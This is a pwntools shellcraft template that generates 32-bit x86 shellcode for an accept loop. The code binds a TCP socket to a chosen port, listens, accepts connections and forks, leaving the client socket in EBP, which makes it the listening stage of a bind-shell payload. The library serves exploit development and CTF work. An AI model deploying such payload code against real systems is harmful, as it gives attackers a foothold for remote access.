<% from pwnlib.shellcraft import common %>
<% from socket import htons %>
<%page args="port"/>
<%docstring>
    Args: port
    Waits for a connection.  Leaves socket in EBP.
    ipv4 only
</%docstring>
<% acceptloop = common.label("acceptloop")
accept = common.label("accept")
parent = common.label("parent")
%>

${acceptloop}:
        /*  Listens for and accepts a connection on ${int(port)}d forever */
        /*  Socket file descriptor is placed in EBP */

        /*  servfd = socket(AF_INET, SOCK_STREAM, 0) */
        push SYS_socket
        pop eax
        cdq
        push edx
        push SOCK_STREAM
        push AF_INET
        push edx
        int 0x80

        /*  bind(servfd, &addr, sizeof addr); // sizeof addr == 0x10 */
        pushw ${htons(int(port))}
        pushw AF_INET
        mov ebx, esp
        push 0x10
        push ebx
        push eax
        push eax
        mov al, SYS_bind
        int 0x80

        /*  listen(servfd, whatever) */
        mov al, SYS_listen
        int 0x80

        /*  sockfd = accept(servfd, NULL, whatever) */
        pop ebx
${accept}:
        push edx
        push ebx
        push ebx
        mov al, SYS_accept
        int 0x80

        /*  fork() */
        push eax
        mov al, SYS_fork
        int 0x80

        /*  close(is_parent ? sockfd : servfd) */
        test eax, eax
        jnz ${parent}
        pop ebp

${parent}:
        push eax
        push SYS_close
        pop eax
        int 0x80

        /*  if(is_parent) goto .accept */
        pop ecx
        test ecx, ecx
        jnz ${accept}
